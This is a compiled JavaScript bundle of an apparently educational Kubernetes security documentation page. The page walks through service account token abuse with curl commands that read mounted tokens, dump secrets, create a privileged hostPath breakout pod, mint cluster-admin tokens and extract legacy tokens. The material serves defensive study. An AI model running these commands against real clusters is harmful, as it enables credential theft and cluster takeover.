"use strict";(globalThis.webpackChunkk_8_s_security=globalThis.webpackChunkk_8_s_security||[]).push([[6607],{4581(e,t,n){n.r(t),n.d(t,{assets:()=>o,contentTitle:()=>a,default:()=>d,frontMatter:()=>i,metadata:()=>s,toc:()=>u});const s=JSON.parse('{"id":"attack-vectors/service-account-token-abuse","title":"Service Account Token Projection Abuse","description":"Attack scenario demonstrating exploitation of service account tokens with excessive permissions or long lifetimes.","source":"@site/docs/attack-vectors/service-account-token-abuse.md","sourceDirName":"attack-vectors","slug":"/attack-vectors/service-account-token-abuse","permalink":"/kubernetes-security/attack-vectors/service-account-token-abuse","draft":false,"unlisted":false,"editUrl":"https://github.com/geek-kb/k8s_security/edit/main/docs/attack-vectors/service-account-token-abuse.md","tags":[{"inline":true,"label":"attack-vector","permalink":"/kubernetes-security/tags/attack-vector"},{"inline":true,"label":"service-accounts","permalink":"/kubernetes-security/tags/service-accounts"},{"inline":true,"label":"tokens","permalink":"/kubernetes-security/tags/tokens"},{"inline":true,"label":"authentication","permalink":"/kubernetes-security/tags/authentication"},{"inline":true,"label":"CKS","permalink":"/kubernetes-security/tags/cks"}],"version":"current","lastUpdatedBy":"Itai Ganot","lastUpdatedAt":1771236448000,"sidebarPosition":19,"frontMatter":{"sidebar_position":19,"title":"Service Account Token Projection Abuse","description":"Attack scenario demonstrating exploitation of service account tokens with excessive permissions or long lifetimes.","keywords":["kubernetes security","service account token","token abuse","privilege escalation","RBAC bypass","API server access","service account security","token projection","kubernetes authentication","JWT token"],"tags":["attack-vector","service-accounts","tokens","authentication","CKS"],"related":["/kubernetes-security/best-practices/cluster-setup-and-hardening/rbac-and-identity/service-account-token-security/","/kubernetes-security/fundamentals/authentication/service-accounts/","/kubernetes-security/attack-vectors/privileged-service-accounts/","/kubernetes-security/attack-vectors/insecure-rbac-permissions/"]},"sidebar":"default","previous":{"title":"ImagePullSecrets Theft","permalink":"/kubernetes-security/attack-vectors/imagepullsecrets-theft"},"next":{"title":"Exec/Attach Credential Theft","permalink":"/kubernetes-security/attack-vectors/exec-attach-credential-theft"}}');var c=n(4848),r=n(8453);const i={sidebar_position:19,title:"Service Account Token Projection Abuse",description:"Attack scenario demonstrating exploitation of service account tokens with excessive permissions or long lifetimes.",keywords:["kubernetes security","service account token","token abuse","privilege escalation","RBAC bypass","API server access","service account security","token projection","kubernetes authentication","JWT token"],tags:["attack-vector","service-accounts","tokens","authentication","CKS"],related:["/kubernetes-security/best-practices/cluster-setup-and-hardening/rbac-and-identity/service-account-token-security/","/kubernetes-security/fundamentals/authentication/service-accounts/","/kubernetes-security/attack-vectors/privileged-service-accounts/","/kubernetes-security/attack-vectors/insecure-rbac-permissions/"]},a="Service Account Token Projection Abuse",o={},u=[{value:"Exploitation Steps",id:"exploitation-steps",level:2},{value:"1. Locate Mounted Service Account Token",id:"1-locate-mounted-service-account-token",level:3},{value:"2. Test Token Permissions",id:"2-test-token-permissions",level:3},{value:"3. Extract Secrets Using Service Account Token",id:"3-extract-secrets-using-service-account-token",level:3},{value:"4. Create Privileged Pods for Container Escape",id:"4-create-privileged-pods-for-container-escape",level:3},{value:"5. Escalate to Cluster Admin via TokenRequest API",id:"5-escalate-to-cluster-admin-via-tokenrequest-api",level:3},{value:"6. Persist Access with Legacy Token Secrets",id:"6-persist-access-with-legacy-token-secrets",level:3},{value:"Result",id:"result",level:3},{value:"Mitigation",id:"mitigation",level:2},{value:"References",id:"references",level:2}];function l(e){const t={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.R)(),...e.components};return(0,c.jsxs)(c.Fragment,{children:[(0,c.jsx)(t.header,{children:(0,c.jsx)(t.h1,{id:"service-account-token-projection-abuse",children:"Service Account Token Projection Abuse"})}),"\n",(0,c.jsxs)(t.p,{children:["Kubernetes ",(0,c.jsx)(t.strong,{children:"service account tokens"})," provide pods with authentication credentials to access the API server. In versions prior to 1.21, these tokens were non-expiring and mounted into every pod by default. Even with modern token projection, misconfigured tokens with excessive permissions or long lifetimes present significant security risks."]}),"\n",(0,c.jsx)(t.p,{children:"This attack demonstrates how compromised pods or containers can abuse service account tokens to escalate privileges, access secrets, and move laterally within the cluster."}),"\n",(0,c.jsx)(t.hr,{}),"\n",(0,c.jsx)(t.h2,{id:"exploitation-steps",children:"Exploitation Steps"}),"\n",(0,c.jsx)(t.p,{children:"Attackers exploit service account tokens that are automatically mounted into pods to gain unauthorized cluster access."}),"\n",(0,c.jsx)(t.h3,{id:"1-locate-mounted-service-account-token",children:"1. Locate Mounted Service Account Token"}),"\n",(0,c.jsxs)(t.p,{children:["Every pod with ",(0,c.jsx)(t.code,{children:"automountServiceAccountToken: true"})," (default) has a token mounted."]}),"\n",(0,c.jsx)(t.pre,{children:(0,c.jsx)(t.code,{className:"language-bash",children:"# Inside a compromised container\nls -la /var/run/secrets/kubernetes.io/serviceaccount/\n\n# View token\ncat /var/run/secrets/kubernetes.io/serviceaccount/token\n\n# View namespace\ncat /var/run/secrets/kubernetes.io/serviceaccount/namespace\n"})}),"\n",(0,c.jsx)(t.h3,{id:"2-test-token-permissions",children:"2. Test Token Permissions"}),"\n",(0,c.jsx)(t.p,{children:"Query the API server to discover what permissions the service account has."}),"\n",(0,c.jsx)(t.pre,{children:(0,c.jsx)(t.code,{className:"language-bash",children:'# Set up environment variables\nTOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\nAPISERVER=https://kubernetes.default.svc\nNAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)\n\n# Test basic API access\ncurl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \\\n  -H "Authorization: Bearer $TOKEN" \\\n  $APISERVER/api/v1/namespaces/$NAMESPACE\n\n# Check self-permissions\ncurl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \\\n  -H "Authorization: Bearer $TOKEN" \\\n  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \\\n  -X POST \\\n  -d \'{\n    "apiVersion": "authorization.k8s.io/v1",\n    "kind": "SelfSubjectAccessReview",\n    "spec": {\n      "resourceAttributes": {\n        "namespace": "\'$NAMESPACE\'",\n        "verb": "list",\n        "resource": "secrets"\n      }\n    }\n  }\'\n'})}),"\n",(0,c.jsx)(t.h3,{id:"3-extract-secrets-using-service-account-token",children:"3. Extract Secrets Using Service Account Token"}),"\n",(0,c.jsx)(t.p,{children:"If the service account has secrets access, extract all secrets in the namespace."}),"\n",(0,c.jsx)(t.pre,{children:(0,c.jsx)(t.code,{className:"language-bash",children:'# List all secrets\ncurl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \\\n  -H "Authorization: Bearer $TOKEN" \\\n  $APISERVER/api/v1/namespaces/$NAMESPACE/secrets\n\n# Get specific secret (database credentials)\ncurl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \\\n  -H "Authorization: Bearer $TOKEN" \\\n  $APISERVER/api/v1/namespaces/$NAMESPACE/secrets/database-credentials \\\n  | jq -r \'.data | map_values(@base64d)\'\n'})}),"\n",(0,c.jsx)(t.p,{children:(0,c.jsx)(t.strong,{children:"Output:"})}),"\n",(0,c.jsx)(t.pre,{children:(0,c.jsx)(t.code,{className:"language-json",children:'{\n  "username": "admin",\n  "password": "SuperSecret123!",\n  "host": "postgres.production.svc.cluster.local"\n}\n'})}),"\n",(0,c.jsx)(t.h3,{id:"4-create-privileged-pods-for-container-escape",children:"4. Create Privileged Pods for Container Escape"}),"\n",(0,c.jsx)(t.p,{children:"If the service account can create pods, spawn a privileged container for host access."}),"\n",(0,c.jsx)(t.pre,{children:(0,c.jsx)(t.code,{className:"language-bash",children:'# Create privileged pod manifest\ncat <<EOF | curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \\\n  -H "Authorization: Bearer $TOKEN" \\\n  -H "Content-Type: application/json" \\\n  $APISERVER/api/v1/namespaces/$NAMESPACE/pods \\\n  -X POST -d @-\n{\n  "apiVersion": "v1",\n  "kind": "Pod",\n  "metadata": {\n    "name": "breakout-pod"\n  },\n  "spec": {\n    "hostNetwork": true,\n    "hostPID": true,\n    "hostIPC": true,\n    "containers": [{\n      "name": "breakout",\n      "image": "alpine:latest",\n      "command": ["sh", "-c", "sleep 3600"],\n      "securityContext": {\n        "privileged": true\n      },\n      "volumeMounts": [{\n        "name": "host",\n        "mountPath": "/host"\n      }]\n    }],\n    "volumes": [{\n      "name": "host",\n      "hostPath": {\n        "path": "/"\n      }\n    }]\n  }\n}\nEOF\n'})}),"\n",(0,c.jsx)(t.h3,{id:"5-escalate-to-cluster-admin-via-tokenrequest-api",children:"5. Escalate to Cluster Admin via TokenRequest API"}),"\n",(0,c.jsxs)(t.p,{children:["If the service account has ",(0,c.jsx)(t.code,{children:"serviceaccounts/token"})," create permissions, generate tokens for other service accounts."]}),"\n",(0,c.jsx)(t.pre,{children:(0,c.jsx)(t.code,{className:"language-bash",children:'# Create token for cluster-admin service account\ncurl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \\\n  -H "Authorization: Bearer $TOKEN" \\\n  -H "Content-Type: application/json" \\\n  $APISERVER/api/v1/namespaces/kube-system/serviceaccounts/cluster-admin/token \\\n  -X POST -d \'{\n    "apiVersion": "authentication.k8s.io/v1",\n    "kind": "TokenRequest",\n    "spec": {\n      "expirationSeconds": 3600\n    }\n  }\' | jq -r \'.status.token\'\n\n# Use the new token\nADMIN_TOKEN="<token-from-above>"\n\n# Now has cluster-admin privileges\ncurl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \\\n  -H "Authorization: Bearer $ADMIN_TOKEN" \\\n  $APISERVER/api/v1/nodes\n'})}),"\n",(0,c.jsx)(t.h3,{id:"6-persist-access-with-legacy-token-secrets",children:"6. Persist Access with Legacy Token Secrets"}),"\n",(0,c.jsx)(t.p,{children:"In clusters with pre-1.24 service accounts, extract non-expiring tokens."}),"\n",(0,c.jsx)(t.pre,{children:(0,c.jsx)(t.code,{className:"language-bash",children:'# List service account secrets\ncurl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \\\n  -H "Authorization: Bearer $TOKEN" \\\n  $APISERVER/api/v1/namespaces/$NAMESPACE/secrets \\\n  | jq \'.items[] | select(.type=="kubernetes.io/service-account-token")\'\n\n# Extract legacy token (never expires)\ncurl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \\\n  -H "Authorization: Bearer $TOKEN" \\\n  $APISERVER/api/v1/namespaces/$NAMESPACE/secrets/default-token-xxxxx \\\n  | jq -r \'.data.token\' | base64 -d\n'})}),"\n",(0,c.jsx)(t.h3,{id:"result",children:"Result"}),"\n",(0,c.jsx)(t.p,{children:"The attacker now has:"}),"\n",(0,c.jsxs)(t.ul,{children:["\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"Persistent API access"})," through stolen service account tokens"]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"Access to secrets"})," including database credentials and API keys"]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"Ability to create privileged pods"})," for container escape"]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"Cluster-admin privileges"})," via token request API abuse"]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"Long-lived tokens"})," in clusters using legacy token secrets"]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"Lateral movement"})," to other namespaces and resources"]}),"\n"]}),"\n",(0,c.jsx)(t.hr,{}),"\n",(0,c.jsx)(t.h2,{id:"mitigation",children:"Mitigation"}),"\n",(0,c.jsx)(t.p,{children:"See the mitigation strategies in:"}),"\n",(0,c.jsx)(t.p,{children:(0,c.jsx)(t.a,{href:"/kubernetes-security/best-practices/cluster-setup-and-hardening/rbac-and-identity/service-account-token-security",children:"Service Account Token Security"})}),"\n",(0,c.jsx)(t.hr,{}),"\n",(0,c.jsx)(t.h2,{id:"references",children:"References"}),"\n",(0,c.jsx)(t.p,{children:"This article is based on information from the following official sources:"}),"\n",(0,c.jsxs)(t.ol,{children:["\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.a,{href:"https://kubernetes.io/docs/reference/access-authn-authz/service-accounts-admin/",children:"Service Account Tokens"})," - Kubernetes Documentation"]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.a,{href:"https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/",children:"Configure Service Accounts for Pods"})," - Kubernetes Documentation"]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.a,{href:"https://kubernetes.io/docs/reference/kubernetes-api/authentication-resources/token-request-v1/",children:"TokenRequest API"})," - Kubernetes API Reference"]}),"\n"]})]})}function d(e={}){const{wrapper:t}={...(0,r.R)(),...e.components};return t?(0,c.jsx)(t,{...e,children:(0,c.jsx)(l,{...e})}):l(e)}},8453(e,t,n){n.d(t,{R:()=>i,x:()=>a});var s=n(6540);const c={},r=s.createContext(c);function i(e){const t=s.useContext(r);return s.useMemo(function(){return"function"==typeof e?e(t):{...t,...e}},[t,e])}function a(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(c):e.components||c:i(e.components),s.createElement(r.Provider,{value:t},e.children)}}}]);